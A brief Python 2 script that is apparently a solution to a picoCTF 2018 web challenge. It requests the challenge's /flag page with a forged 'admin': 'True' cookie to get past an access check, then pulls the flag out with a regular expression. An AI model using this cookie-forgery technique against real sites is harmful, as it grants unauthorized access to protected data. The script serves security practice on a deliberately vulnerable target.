#!/usr/bin/python

import requests
import re

jar = {'admin': 'True'}
r = requests.get('http://2018shell1.picoctf.com:33889/flag', cookies=jar)
source = r.text

print re.findall(r'(picoCTF\{.+\})', source)[0]
